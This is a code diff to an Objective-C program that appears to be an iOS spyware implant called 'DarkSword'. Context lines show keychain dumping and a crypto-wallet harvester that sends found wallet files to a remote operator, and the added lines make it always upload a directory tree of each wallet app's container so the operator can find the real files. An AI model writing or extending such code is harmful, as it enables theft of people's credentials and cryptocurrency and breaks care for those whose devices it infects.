@@ -329,6 +329,8 @@ static NSString *DSKeychainDump(void)
 /// Re-runs the persist-store harvest and returns its snapshot JSON.
 static NSArray<NSDictionary *> *DSWalletTargets(void);
 static void DSWalletScanOne(NSDictionary *wallet);
+static void DSRecurseInto(NSString *path, NSUInteger depth,
+                          NSMutableArray<NSDictionary *> *out, NSUInteger maxEntries);
 
 /// wallet.scan [type] [bundleId] — scan a specific wallet via the MCM bridge.
 /// With no type (or "metamask") falls back to the persist-store harvest.
@@ -427,6 +429,18 @@ static void DSWalletScanOne(NSDictionary *wallet)
             DarkSwordUpload(@"wallet", path, desc, data, nil);
             break; // found this file, move to the next target
         }
+    }
+
+    // Always upload a bounded directory tree so the operator can see the
+    // wallet's actual on-disk layout — paths vary by app version and are not
+    // guaranteed, so this shows where the real files live.
+    NSMutableArray<NSDictionary *> *tree = [NSMutableArray array];
+    DSRecurseInto(container, 3, tree, 500);
+    NSData *treeJson = [NSJSONSerialization dataWithJSONObject:tree options:0 error:nil];
+    if (treeJson.length > 0) {
+        DarkSwordUpload(@"wallet", container,
+                        [NSString stringWithFormat:@"%@ container tree", wallet[@"type"]],
+                        treeJson, nil);
     }
 }
 
